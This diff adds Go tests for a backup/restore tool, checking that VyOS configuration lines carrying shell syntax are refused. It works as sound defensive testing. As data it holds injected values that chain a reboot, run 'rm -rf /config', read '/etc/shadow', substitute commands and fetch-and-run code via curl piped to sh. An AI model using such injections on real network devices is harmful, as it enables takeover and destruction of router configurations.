@@ -322,3 +322,87 @@ func TestIdentityParsingAndMismatch(t *testing.T) {
 		t.Fatal("a different model or serial is a mismatch")
 	}
 }
+
+// VyOS configuration mode is a bash shell: no line of a version may carry anything a shell acts on.
+func TestValidVyOSConfigRefusesShellInput(t *testing.T) {
+	good := []string{
+		vyosRunning,
+		vyosRestore,
+		"set system host-name vyos",
+		"set interfaces ethernet eth0 description 'LAN; uplink | $(whoami) `id` && x'",
+		"set interfaces ethernet eth0 description 'مكتب'",
+		"set firewall name WAN_IN rule 10 destination address 10.0.0.0/8",
+		"set interfaces ethernet eth0 address dhcp",
+		"set protocols static route 0.0.0.0/0 next-hop 192.168.1.254",
+		"set system ntp server 0.pool.ntp.org",
+		"set interfaces ethernet eth0 hw-id 00:11:22:33:44:55",
+		"set service dns forwarding listen-address 2001:db8::1",
+		"set system login user admin full-name ''",
+	}
+	for _, c := range good {
+		if !validVyOSConfig(c) {
+			t.Errorf("a real VyOS line was refused: %q", c)
+		}
+	}
+	bad := []string{
+		"set system host-name x; reboot now",
+		"set system host-name x;reboot",
+		"set system host-name x | sh",
+		"set system host-name x && rm -rf /config",
+		"set system host-name x || true",
+		"set system host-name x & sleep 10",
+		"set system host-name `id`",
+		"set system host-name $(id)",
+		"set system host-name $HOME",
+		"set system host-name ${IFS}",
+		"set system host-name x > /config/config.boot",
+		"set system host-name x < /etc/shadow",
+		"set system host-name \"$(id)\"",
+		"set system host-name 'x'$(id)",
+		"set system host-name 'x''y'",
+		"set system host-name 'unterminated",
+		`set system host-name x\;id`,
+		"set system host-name ~root",
+		"set system host-name *",
+		"set system host-name x\tid",
+		"set system host-name x\rreboot",
+		"set system host-name x\x03",
+		"set system host-name x\x1b[A",
+		"set system host-name x\x7f",
+		"set system host-name x\u0085id",
+		"set system host-name !!",
+		"set system host-name x #comment",
+		"set system host-name (x)",
+		"set system host-name {a,b}",
+		"set $(id) x",
+		"set 'system' host-name x",
+		"set;id",
+		"set",
+		"show configuration",
+		"delete system",
+		"set system host-name x\nrun reboot now",
+		"set system host-name ok\n; reboot",
+		"set system host-name \xff\xfe",
+	}
+	for _, c := range bad {
+		if validVyOSConfig(c) {
+			t.Errorf("a hostile line was accepted: %q", c)
+		}
+	}
+}
+
+func TestRestoreVyOSHostileVersionNeverReachesTheDevice(t *testing.T) {
+	ctx := context.Background()
+	for _, extra := range []string{
+		"set system host-name x; reboot now",
+		"set system host-name $(curl http://203.0.113.9/x|sh)",
+		"set system host-name `id`",
+	} {
+		v := &vyosDevice{}
+		srv, tg := startVyOS(t, v)
+		_, err := Restore(ctx, tg, RestoreSpec{Config: vyosRestore + "\n" + extra}, opts(srv.addr))
+		if KindOf(err) != ErrInvalidArgument || v.sessions != 0 || v.setLines != 0 {
+			t.Fatalf("%q: want ErrInvalidArgument before login, got %v (%d sessions, %d set lines)", extra, err, v.sessions, v.setLines)
+		}
+	}
+}
